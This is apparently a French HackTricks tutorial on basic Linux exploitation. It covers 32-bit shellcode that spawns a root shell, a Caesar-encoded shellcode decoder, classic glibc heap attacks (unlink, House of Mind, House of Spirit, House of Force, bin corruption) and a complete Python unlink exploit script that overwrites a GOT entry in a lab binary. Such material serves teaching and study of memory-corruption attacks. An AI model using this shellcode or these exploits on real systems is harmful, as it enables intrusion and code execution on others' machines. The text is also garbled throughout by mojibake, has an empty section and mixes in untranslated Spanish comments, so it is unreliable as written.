# Linux Exploiting (Basic) (FRA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** ‚Äî> Renvoie un fichier .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable compos√© du code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, un astuce peut √™tre utilis√©e. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons ins√©r√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EX **ASTUCE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ en utilisant la pile (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV :**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature sp√©cifique dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Ce sont des shells chiffr√©es qui contiennent un petit code pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©thodes compl√©mentaires**













###





## **8 D√©bordements de tas : Exploits de base**

**Chunk allou√©**

prev_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Chunk libre**

prev_size |\
size |\
\*fd | Ptr chunk suivant\
\*bk | Ptr chunk pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les chunks libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux chunks libres cons√©cutifs (ils sont fusionn√©s)

Dans "size", il y a des bits pour indiquer : si le chunk pr√©c√©dent est en cours d'utilisation, si le chunk a √©t√© allou√© via mmap() et si le chunk appartient √† l'ar√®ne principale.

Lorsqu'un chunk est lib√©r√© et que l'un des chunks adjacents est libre, ils sont fusionn√©s √† l'aide de la macro unlink() et le nouveau chunk le plus grand est pass√© √† frontlink() pour qu'il l'ins√®re dans le bon bin.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui du chunk qui √©tait d√©j√† libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui du chunk qui √©tait d√©j√† libre avant\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Par cons√©quent, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ainsi, le shellcode s'ex√©cute √† la sortie du programme.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre ajust√© pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Ainsi, l'exploit est cr√©√© :

Dans le buffer1, nous ins√©rons le shellcode en commen√ßant par un jmp pour qu'il atteigne les nops ou le reste du shellcode.

Apr√®s le shellcode, nous ins√©rons du rembourrage jusqu'√† atteindre le champ prev_size et size du chunk suivant. Nous mettons 0xfffffff0 √† ces emplacements (pour √©craser prev_size afin qu'il ait le bit indiquant qu'il est libre) et "-4" (0xfffffffc) dans size (pour que lorsqu'il v√©rifie dans le 3√®me chunk si le 2√®me √©tait libre, il aille en r√©alit√© au prev_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() enqu√™te, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me chunk est libre. Il appellera alors **unlink()**.

En appelant unlink(), les premi√®res donn√©es du 2√®me chunk seront utilis√©es comme P->fd, donc l'adresse √† √©craser - 12 sera ins√©r√©e √† cet endroit (car dans FD->bk, 12 sera ajout√© √† l'adresse stock√©e dans FD). Et √† cette adresse, la deuxi√®me adresse trouv√©e dans le 2√®me chunk sera ins√©r√©e, qui sera l'adresse du shellcode (fausse P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de remplissage**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1**

**fake_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le "size" du 3√®me chunk soit 4 octets en arri√®re (pointe vers prev_size) car c'est l√† qu'il v√©rifie si le 2√®me chunk est libre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #Dans la charge utile, nous ajoutons 8 octets de remplissage au d√©but**

**got_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (sera l'adresse √©cras√©e pour ex√©cuter le shellcode la 2√®me fois que free est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Comme mentionn√©, la charge utile commence par 8 octets de remplissage pour une raison quelconque**

**payload += prev_size + fake_size + got_free + addr_sc #Le 2√®me chunk est modifi√©, got_free pointe vers l'endroit o√π nous allons stocker l'adresse addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() lib√©rant dans l'ordre inverse (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de leur r√©servation.

Dans ce cas :

Le shellcode est plac√© dans le chunk c

Le chunk a est utilis√© pour √©craser le b de sorte que le size ait le bit PREV_INUSE d√©sactiv√©, de sorte que le programme pense que le chunk a est libre.

De plus, le size dans l'en-t√™te de b est √©cras√© pour qu'il soit √©gal √† -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, il appellera donc unlink() pour le d√©tacher. Cependant, comme l'en-t√™te PREV_SIZE vaut -4, il pensera que le chunk "a" commence r√©ellement √† b+4. Cela signifie qu'il fera un unlink() sur un chunk commen√ßant √† b+4, donc √† b+12 se trouvera le pointeur "fd" et √† b+16 se trouvera le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse du shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre charge utile.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un √©l√©ment est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© directement, mais frontlink() est appel√© directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon pouvant √™tre d√©bord√© avec la fonction de saisie de donn√©es

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de son en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent

Un tampon d√©clar√© avant l'√©tape 3 qui permet de remplacer prev_size de celui-ci

En contr√¥lant ainsi deux mallocs de mani√®re incontr√¥l√©e et un de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons cr√©er un exploit.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on veut r√©utiliser l'un, cela se fera sans probl√®me. Si l'on veut utiliser l'autre, il occupera le m√™me espace, de sorte que les pointeurs "fd" et "bk" seront falsifi√©s avec les donn√©es √©crites par la r√©servation pr√©c√©dente.

**Apr√®s free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.
## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Seul un appel √† free() est n√©cessaire pour d√©clencher l'ex√©cution de code arbitraire. Il est int√©ressant de rechercher un deuxi√®me morceau qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() entra√Æne un appel √† public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur vers l'adresse o√π commence le morceau (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON\_MAIN\_ARENA, qui peut √™tre modifi√© pour que la v√©rification renvoie vrai et ex√©cute heap\_for\_ptr() qui effectue un "et" sur "mem", mettant √† z√©ro les 2,5 octets les moins significatifs (dans notre cas, de 0x0804a000 √† 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme s'il s'agissait d'une structure heap\_info).

Ainsi, si nous pouvons contr√¥ler un morceau par exemple √† 0x0804a000 et qu'un morceau va √™tre lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me morceau sera lib√©r√©, heap\_for\_ptr(ptr)->ar\_ptr renverra ce que nous avons √©crit √† 0x08100000 (car l'op√©ration "et" vue pr√©c√©demment est appliqu√©e √† 0x081002a0 et de l√†, la valeur des 4 premiers octets, ar\_ptr, est extraite).

Ainsi, \_int\_free(ar\_ptr, mem) est appel√©, c'est-√†-dire, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le morceau qui va √™tre lib√©r√©.

Comme unsorted\_chunks est d√©fini, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de \_\_DTOR\_END\_\_-12 dans av->bins\[2], √† la derni√®re instruction, la valeur de \_\_DTOR\_END\_\_ sera √©crite √† l'adresse du deuxi√®me morceau.

Cela signifie que dans le premier morceau, nous devons mettre au d√©but plusieurs fois l'adresse de \_\_DTOR\_END\_\_-12 car av->bins\[2] la r√©cup√©rera de l√†.

√Ä l'adresse o√π tombe l'adresse du deuxi√®me morceau avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier morceau pour que heap\_for\_ptr() pense que ar\_ptr est au d√©but du premier morceau et r√©cup√®re av->bins\[2] de l√†.

Dans le deuxi√®me morceau et gr√¢ce au premier, nous √©crasons prev\_size avec un saut de 0x0c et size avec quelque chose pour activer -> NON\_MAIN\_ARENA.

Ensuite, dans le deuxi√®me morceau, nous mettons beaucoup de nops et enfin le code shell.

Ainsi, \_int\_free(TROZO1, TROZO2) sera appel√© et suivra les instructions pour √©crire l'adresse du prev\_size du TROZO2 dans \_\_DTOR\_END\_\_, qui sautera ensuite au code shell.

Pour appliquer cette technique, il faut que certains autres pr√©requis soient remplis, ce qui complique un peu plus la charge utile.

Cette technique n'est plus applicable car elle a √©t√© presque enti√®rement patch√©e comme pour unlink. On v√©rifie si le nouvel emplacement pointe √©galement vers lui-m√™me.

**Fastbin**

C'est une variante de The house of mind.

Nous voulons ex√©cuter le code suivant, qui est atteint apr√®s la premi√®re v√©rification de la fonction \_int\_free() :

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> O√π fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Ainsi, si nous mettons une adresse dans "fb" qui pointe vers une fonction dans la GOT, √† cette adresse sera plac√©e l'adresse du morceau √©cras√©. Pour cela, il sera n√©cessaire que l'ar√®ne soit proche des adresses des dtors. Plus pr√©cis√©ment, av->max\_fast doit √™tre √† l'adresse que nous allons √©craser.

Comme nous l'avons vu avec The House of Mind, nous contr√¥lions la position de av.

Ainsi, si nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE dans le champ size, fastbin\_index() nous renverra fastbins\[-1\], qui pointera vers av->max\_fast.

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (non celle vers laquelle elle pointe, mais cette position sera √©cras√©e).

De plus, il faut que le morceau contigu √† celui lib√©r√© soit sup√©rieur √† 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 8, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera √©galement dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe sur des nops).

De plus, ce m√™me faux morceau doit √™tre inf√©rieur √† av->system\_mem. av->system\_mem se trouve √† 1848 octets plus loin.

En raison des z√©ros de \_DTOR\_END\_ et des quelques adresses dans la GOT, aucune de ces adresses de ces sections ne convient pour √™tre √©cras√©e, donc voyons comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque consiste √† rediriger **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8, alors : fastbin\_index() nous renverra fastbins\[0\] et nous pouvons utiliser cela pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni de valeurs √©tranges sur la pile, en fait nous devons nous trouver ici : 4 octets nuls + EBP + RET

Les 4 octets nuls sont n√©cessaires pour que **av** soit √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

**av->max\_fast** sera l'EBP et sera une valeur qui nous permettra de contourner les restrictions.

Dans **av->fastbins\[0\]**, l'adresse de **p** sera √©cras√©e et sera le RET, ainsi la shellcode sera ex√©cut√©e.

De plus, √† **av->system\_mem** (1484 octets au-dessus de la position sur la pile), il y aura suffisamment de d√©chets qui nous permettront de contourner la v√©rification effectu√©e.

De plus, le morceau contigu √† celui lib√©r√© doit √™tre sup√©rieur √† 8 -> Comme nous l'avons dit que la taille du morceau lib√©r√© est de 16, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera √©galement dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe sur des nops qui se trouvent apr√®s le champ size du nouveau faux morceau).

**The House of Spirit**

Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre modifi√© par l'attaquant (par exemple, le pointeur est sur la pile sous un √©ventuel d√©bordement sur une variable).

Ainsi, nous pourrions faire pointer ce pointeur o√π nous voulons. Cependant, n'importe quel emplacement n'est pas valide, la taille du faux morceau doit √™tre inf√©rieure √† av->max\_fast et plus sp√©cifiquement √©gale √† la taille demand√©e dans un futur appel √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable un malloc(40) est appel√©, la taille du faux morceau doit √™tre de 48.
Si par exemple le programme demande √† l'utilisateur un nombre, nous pourrions entrer 48 et pointer le pointeur de malloc modifiable sur les 4 octets suivants (qui pourraient appartenir √† l'EBP avec un peu de chance, donc le 48 se retrouve derri√®re, comme s'il √©tait l'en-t√™te size). De plus, l'adresse ptr-4+48 doit remplir plusieurs conditions (dans ce cas ptr=EBP), c'est-√†-dire, 8 < ptr-4+48 < av->system\_mem.

Si cela se produit, lorsque le prochain malloc est appel√©, que nous avons dit √™tre malloc(40), il se verra attribuer l'adresse de l'EBP. Si l'attaquant peut √©galement contr√¥ler ce qui est √©crit dans ce malloc, il peut √©craser √† la fois l'EBP et l'EIP avec l'adresse de son choix.

Cela est d√ª au fait que lorsqu'il sera lib√©r√© avec free(), il enregistrera que l'adresse point√©e par l'EBP de la pile contient un morceau de taille parfaite pour le nouveau malloc() √† r√©server, donc il lui attribuera cette adresse.

**La Maison de la Force**

Il est n√©cessaire de :

* Un d√©bordement sur un morceau permettant de remplacer le wilderness
* Un appel √† malloc() avec la taille d√©finie par l'utilisateur
* Un appel √† malloc() dont les donn√©es peuvent √™tre d√©finies par l'utilisateur

La premi√®re chose √† faire est de remplacer la taille du morceau wilderness par une valeur tr√®s grande (0xffffffff), de sorte que toute demande de m√©moire suffisamment grande sera trait√©e dans \_int\_malloc() sans avoir besoin d'√©tendre le tas.

La deuxi√®me √©tape consiste √† modifier av->top pour qu'il pointe vers une zone m√©moire sous le contr√¥le de l'attaquant, comme la pile. Dans av->top, nous mettrons \&EIP - 8.

Nous devons remplacer av->top pour qu'il pointe vers la zone m√©moire sous le contr√¥le de l'attaquant :

victime = av->top;

reste = morceau\_√†\_l'offset(victime, nb);

av->top = reste;

La victime r√©cup√®re la valeur de l'adresse du wilderness actuel (l'actuel av->top) et le reste est exactement la somme de cette adresse plus la quantit√© d'octets demand√©e par malloc(). Ainsi, si \&EIP-8 est √† 0xbffff224 et av->top contient 0x080c2788, alors la quantit√© que nous devons r√©server dans le malloc contr√¥l√© pour que av->top pointe vers $EIP-8 pour le prochain malloc() sera :

0xbffff224 - 0x080c2788 = 3086207644.

Ainsi, la valeur modifi√©e sera enregistr√©e dans av->top et le prochain malloc pointera vers l'EIP et pourra l'√©craser.

Il est important que la taille du nouveau morceau wilderness soit plus grande que la demande faite par le dernier malloc(). Autrement dit, si le wilderness pointe vers \&EIP-8, la taille sera juste dans le champ EBP de la pile.

**La Maison de la Connaissance**

**Corruption SmallBin**

Les morceaux lib√©r√©s sont plac√©s dans le bin en fonction de leur taille. Avant d'√™tre plac√©s, ils sont stock√©s dans des bacs non tri√©s. Lorsqu'un morceau est lib√©r√©, il n'est pas imm√©diatement plac√© dans son bin, mais reste dans les bacs non tri√©s. Ensuite, s'il y a une nouvelle demande de morceau et que le morceau pr√©c√©demment lib√©r√© peut convenir, il est renvoy√©, mais s'il y a une demande de taille sup√©rieure, le morceau lib√©r√© dans les bacs non tri√©s est plac√© dans son bin appropri√©.

Pour atteindre le code vuln√©rable, la demande de m√©moire doit √™tre sup√©rieure √† av->max\_fast (g√©n√©ralement 72) et inf√©rieure √† MIN\_LARGE\_SIZE (512).

Si le bin contient un morceau de la taille demand√©e, il est renvoy√© apr√®s avoir √©t√© d√©tach√© :

bck = victime->bk; Pointe vers le morceau pr√©c√©dent, c'est la seule information que nous pouvons modifier.

bin->bk = bck; Le morceau avant-dernier devient le dernier, si bck pointe vers la pile, le prochain morceau r√©serv√© recevra cette adresse

bck->fd = bin; La liste est ferm√©e en faisant pointer ceci vers bin

Il est n√©cessaire de :

De r√©server deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le second ait √©t√© lib√©r√© et plac√© dans son bin (c'est-√†-dire, un malloc plus grand que le deuxi√®me morceau doit √™tre r√©serv√© avant le d√©bordement)

Que le malloc r√©serv√© avec l'adresse choisie par l'attaquant soit contr√¥l√© par l'attaquant.

L'objectif est le suivant, si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons modifier son pointeur bk. Si nous modifions son pointeur bk et que ce morceau devient le premier de la liste du bin et est r√©serv√©, le bin sera tromp√© et on lui dira que le dernier morceau de la liste (le prochain √† offrir) est √† l'adresse fausse que nous avons indiqu√©e (vers la pile ou la GOT par exemple). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des autorisations dessus, il recevra un morceau √† l'endroit souhait√© et pourra √©crire dessus.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui lib√©r√©, de sorte que le morceau modifi√© sorte des bacs non tri√©s et soit plac√© dans son bin.

Une fois dans son bin, il est temps de modifier son pointeur bk via le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit r√©utilis√© et trompe le bin en lui faisant croire que le prochain morceau est √† l'adresse fausse. Ensuite, le morceau qui nous int√©resse sera donn√©.

Pour ex√©cuter la vuln√©rabilit√© le plus rapidement possible, l'id√©al serait : R√©server le morceau vuln√©rable, r√©server le morceau qui sera modifi√©, lib√©rer ce morceau, r√©server un morceau plus grand que celui qui sera modifi√©, modifier le morceau (vuln√©rabilit√©), r√©server un morceau de la m√™me taille que celui qui a √©t√© viol√© et r√©server un deuxi√®me morceau de la m√™me taille et celui-ci pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique est utilis√©e pour s'assurer que le morceau n'est pas faux : on v√©rifie si bck->fd pointe vers la victime. Autrement dit, dans notre cas, si le pointeur fd\* du morceau faux point√© dans la pile pointe vers la victime. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement via la pile) √† l'adresse appropri√©e l'adresse de la victime. Ainsi, cela ressemblera √† un morceau r√©el.

**Corruption LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires, ainsi que d'autres, en plus les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est similaire √† la pr√©c√©dente, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc(), mais il faut √©galement modifier la taille du morceau modifi√© de sorte que cette taille - nb soit < MINSIZE.

Par exemple, il faudra mettre une taille de 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned)

De plus, un correctif a √©t√© introduit pour le rendre encore plus compliqu√©.

**Heap Spraying**

Essentiellement, il s'agit de r√©server autant de m√©moire que possible pour les tas et de les remplir avec un matelas de nops suivis d'un shellcode. De plus, 0x0c est utilis√© comme matelas. On essaiera de sauter √† l'adresse 0x0c0c0c0c, ainsi si une adresse √† laquelle on va appeler est √©cras√©e avec ce matelas, le programme sautera l√†. Fondamentalement, la tactique est de r√©server autant que possible pour voir si un pointeur est √©cras√© et de sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Il s'agit de cimenter la m√©moire en r√©servant et en lib√©rant des morceaux de mani√®re √† ce qu'il reste des morceaux r√©serv√©s entre des morceaux libres. Le buffer √† d√©border sera plac√© dans l'un de ces espaces libres.

**objdump -d executable** ‚Äî> D√©sassembler les fonctions\
**objdump -d ./PROGRAMME | grep FONCTION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et obtenir les opcodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions des biblioth√®ques (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtient l'adresse de puts √† √©craser dans le GOT\
**objdump -D ./exec** ‚Äî> D√©sassemble TOUT jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la fonction en gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)
* [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
* [https://pwnable.tw/](https://pwnable.tw/)
* [https://ctf.hackucf.org/](https://ctf.hackucf.org/)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
